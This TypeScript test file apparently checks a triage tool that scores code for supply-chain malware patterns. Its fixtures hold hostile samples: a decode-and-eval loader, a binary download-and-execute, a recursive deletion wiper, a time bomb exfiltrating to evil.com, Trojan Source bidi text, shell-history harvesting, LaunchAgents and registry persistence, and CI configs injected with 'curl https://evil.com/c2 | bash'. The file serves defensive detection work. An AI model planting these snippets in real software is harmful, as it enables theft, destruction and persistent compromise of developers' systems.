/**
 * Unit tests for LLM triage logic.
 * Tests that malicious code patterns cross the MIN_TRIAGE_SCORE threshold
 * and legitimate code stays below it.
 */

import { runTriage, type TriageResult } from './tools.js';

const MIN_TRIAGE_SCORE = 8;

let passed = 0;
let failed = 0;

function assert(label: string, condition: boolean, detail = '') {
  if (condition) {
    console.log(`  ✓ ${label}`);
    passed++;
  } else {
    console.error(`  ✗ ${label}${detail ? '\n      got: ' + detail : ''}`);
    failed++;
  }
}

function triage(filePath: string, content: string): TriageResult | null {
  const results = runTriage(new Map([[filePath, content]]));
  return results.find(r => r.filePath === filePath) ?? null;
}

// ── Helpers — realistic malicious code from known attack patterns ─────────────

// Based on the event-stream / flatmap-stream incident (2018):
// Attacker added an encrypted payload in a postinstall script that decoded
// and executed code at install time to steal bitcoin wallets.
const EVENT_STREAM_STYLE = `
const r = require, es = r('events'), co = r('co');
const decode = r('./lib/decode');
const t = es.EventEmitter;
const d = new Buffer(
  'db67d919d8b489a5b6f5b8f6f6f6b5a6',
  'hex'
);
co(function*() {
  const payload = decode(d.toString());
  eval(payload);
}).catch(function(){});
`;

// Based on ua-parser-js (2021): malware hidden in postinstall
// that phone-homes and downloads+executes a binary
const UA_PARSER_STYLE = `
const { execSync } = require('child_process');
const os = require('os');
const https = require('https');
const fs = require('fs');
const tmpDir = os.tmpdir();
const binaryPath = tmpDir + '/update';

https.get('https://citationsherbe.at/sdd.exe', (res) => {
  const file = fs.createWriteStream(binaryPath);
  res.pipe(file);
  file.on('finish', () => {
    fs.chmodSync(binaryPath, '755');
    execSync(binaryPath);
  });
});
`;

// Based on node-ipc (2022): file wiper targeting Russian/Belarusian IPs.
// Detected via: conditional-os + write pattern + IP geolocation
const NODE_IPC_STYLE = `
const os = require('os');
const { exec } = require('child_process');
const ips = require('./geoloc');

if (os.platform() === 'linux' && ips.isRussianIP()) {
  exec('find / -name "*.js" | xargs rm -rf');
}
`;

// Based on SolarWinds-style time-bomb: sleeps 14 days before activating
const SOLARWINDS_TIMEBOMB = `
const ACTIVATION_DATE = 1800000000000; // ~2027
module.exports = function run(cmd) {
  if (Date.now() > ACTIVATION_DATE) {
    const cp = require('child_process');
    cp.exec(cmd, (err, stdout) => {
      require('https').get('https://evil.com/c2?d=' + Buffer.from(stdout).toString('base64'));
    });
  }
};
`;

// Trojan Source: hidden code via bidirectional Unicode overrides
// CVE-2021-42574 — the comment appears safe but the execution path is not
const TROJAN_SOURCE = `
if (accessLevel !== 'user') { /* Check if admin ‮ ⁦ } if (isAdmin) { ⁩ ⁦ */ return false; }
exfiltrate(secrets);
`;

console.log(`\n── Triage threshold (MIN=${MIN_TRIAGE_SCORE}): attack patterns must cross it ──`);

function assertAboveThreshold(label: string, filePath: string, content: string) {
  const result = triage(filePath, content);
  const score = result?.score ?? 0;
  assert(`${label} — score ${score} ≥ ${MIN_TRIAGE_SCORE}`,
    score >= MIN_TRIAGE_SCORE,
    `indicators: ${JSON.stringify(result?.indicators ?? {})}`);
  return result;
}

assertAboveThreshold('event-stream style (eval+encode)', 'lib/index.js', EVENT_STREAM_STYLE);
assertAboveThreshold('ua-parser-js style (fetch+exec binary)', 'scripts/postinstall.js', UA_PARSER_STYLE);
assertAboveThreshold('node-ipc style (conditional-os + exec)', 'lib/index.js', NODE_IPC_STYLE);
assertAboveThreshold('SolarWinds time-bomb (Date.now + exec)', 'lib/worker.js', SOLARWINDS_TIMEBOMB);
assertAboveThreshold('Trojan Source (bidirectional unicode)', 'lib/auth.js', TROJAN_SOURCE);

console.log('\n── Compound scoring: multi-category multiplier ──');

// File with only 1 category
const singleCat = `eval(response);`; // loader only
const singleResult = triage('a.js', singleCat);

// File with 3 categories (loader + timebomb + env) → should get 2.5x multiplier
const multiCatCode = `
  process.env.HOME;                               // env category
  if (Date.now() > 1800000000000) {               // timebomb category
    eval(response);                               // loader category
  }
`;
const multiResult = triage('b.js', multiCatCode);
const singleScore = singleResult?.score ?? 0;
const multiScore = multiResult?.score ?? 0;

assert(`multi-category file scores higher than single-category (${multiScore} > ${singleScore})`,
  multiScore > singleScore,
  `single=${singleScore}, multi=${multiScore}`);

assert(`multi-category file (3 cats) triggers 2.5x multiplier (score ≥ 20)`,
  multiScore >= 20,
  `score=${multiScore}`);

console.log('\n── False-positive guard: legitimate code stays below threshold ──');

const LEGIT_REACT_COMPONENT = `
import React, { useState, useEffect } from 'react';
export function UserCard({ userId }) {
  const [user, setUser] = useState(null);
  useEffect(() => {
    fetch('/api/users/' + userId)
      .then(r => r.json())
      .then(setUser);
  }, [userId]);
  return React.createElement('div', null, user?.name);
}
`;

const LEGIT_UTILITY = `
export function debounce(fn, delay) {
  let timer;
  return function(...args) {
    clearTimeout(timer);
    timer = setTimeout(() => fn.apply(this, args), delay);
  };
}
export function throttle(fn, limit) {
  let lastCall = 0;
  return function(...args) {
    const now = Date.now();
    if (now - lastCall >= limit) { lastCall = now; fn.apply(this, args); }
  };
}
`;

const LEGIT_DATE_CHECK = `
// Feature flag: new UI enabled after launch date
const LAUNCH_DATE = new Date('2025-01-01');
export function isNewUiEnabled() {
  return new Date() > LAUNCH_DATE;
}
`;

function assertBelowThreshold(label: string, filePath: string, content: string) {
  const result = triage(filePath, content);
  const score = result?.score ?? 0;
  const indicators = result?.indicators ? JSON.stringify(Object.fromEntries(result.indicators)) : 'none';
  assert(`${label} — score ${score} < ${MIN_TRIAGE_SCORE}`,
    score < MIN_TRIAGE_SCORE,
    `indicators: ${indicators}`);
}

assertBelowThreshold('React component with fetch', 'components/UserCard.jsx', LEGIT_REACT_COMPONENT);
assertBelowThreshold('utility with setTimeout', 'lib/utils.js', LEGIT_UTILITY);
assertBelowThreshold('feature-flag date check', 'lib/flags.js', LEGIT_DATE_CHECK);

console.log('\n── New indicators: shell history, platform persist, CI/CD platforms ──');

// Shell history harvesting — common in credential-exfil payloads
const BASH_HISTORY_HARVEST = `
import os, subprocess
home = os.path.expanduser('~')
for f in ['.bash_history', '.zsh_history']:
    path = os.path.join(home, f)
    if os.path.exists(path):
        with open(path) as fh:
            data += fh.read()
`;
const bashHistoryResult = triage('setup.py', BASH_HISTORY_HARVEST);
assert(
  `bash_history harvest fires credential-files (score ${bashHistoryResult?.score ?? 0})`,
  (bashHistoryResult?.categories.has('creds') ?? false) && (bashHistoryResult?.score ?? 0) >= MIN_TRIAGE_SCORE
);

// macOS LaunchAgents — persistence via user-level launch daemon
const LAUNCHAGENTS_PERSIST = `
import os, plistlib
agent = {
    'Label': 'com.update.service',
    'ProgramArguments': ['/usr/bin/python3', '/tmp/payload.py'],
    'RunAtLoad': True,
}
path = os.path.expanduser('~/Library/LaunchAgents/com.update.service.plist')
with open(path, 'wb') as f:
    plistlib.dump(agent, f)
os.system('launchctl load ' + path)
`;
const launchAgentsResult = triage('setup.py', LAUNCHAGENTS_PERSIST);
assert(
  `LaunchAgents write fires system-persist (score ${launchAgentsResult?.score ?? 0})`,
  (launchAgentsResult?.categories.has('persist') ?? false) && (launchAgentsResult?.score ?? 0) >= MIN_TRIAGE_SCORE
);

// Windows registry run key — persistence via HKEY_CURRENT_USER
const REGISTRY_PERSIST = `
const { execSync } = require('child_process');
execSync('reg.exe add HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v Updater /t REG_SZ /d C:\\\\tmp\\\\payload.exe /f');
`;
const registryResult = triage('scripts/install.js', REGISTRY_PERSIST);
assert(
  `Windows registry run-key fires system-persist (score ${registryResult?.score ?? 0})`,
  (registryResult?.categories.has('persist') ?? false) && (registryResult?.score ?? 0) >= MIN_TRIAGE_SCORE
);

// CircleCI config poisoning
const CIRCLECI_POISON = `
const fs = require('fs');
const path = require('path');
const payload = \`version: 2.1\\njobs:\\n  build:\\n    steps:\\n      - run: curl https://evil.com/c2 | bash\`;
fs.writeFileSync('.circleci/config.yml', payload);
`;
const circleciResult = triage('scripts/postinstall.js', CIRCLECI_POISON);
assert(
  `CircleCI config write fires ci-workflow-write (score ${circleciResult?.score ?? 0})`,
  (circleciResult?.categories.has('cicd') ?? false) && (circleciResult?.score ?? 0) >= MIN_TRIAGE_SCORE
);

// Azure Pipelines config poisoning
const AZURE_POISON = `
const fs = require('fs');
fs.writeFileSync('azure-pipelines.yml',
  'trigger:\\n- main\\njobs:\\n- job: Build\\n  steps:\\n  - script: curl https://evil.com/c2 | bash'
);
`;
const azureResult = triage('scripts/postinstall.js', AZURE_POISON);
assert(
  `Azure Pipelines config write fires ci-workflow-write (score ${azureResult?.score ?? 0})`,
  (azureResult?.categories.has('cicd') ?? false) && (azureResult?.score ?? 0) >= MIN_TRIAGE_SCORE
);

// Travis CI config poisoning
const TRAVIS_POISON = `
const fs = require('fs');
fs.writeFileSync('.travis.yml', 'language: node_js\\nafter_success:\\n  - curl https://evil.com/c2 | bash');
`;
const travisResult = triage('scripts/postinstall.js', TRAVIS_POISON);
assert(
  `Travis CI config write fires ci-workflow-write (score ${travisResult?.score ?? 0})`,
  (travisResult?.categories.has('cicd') ?? false) && (travisResult?.score ?? 0) >= MIN_TRIAGE_SCORE
);

console.log(`\n── Results: ${passed} passed, ${failed} failed ──\n`);
if (failed > 0) process.exit(1);
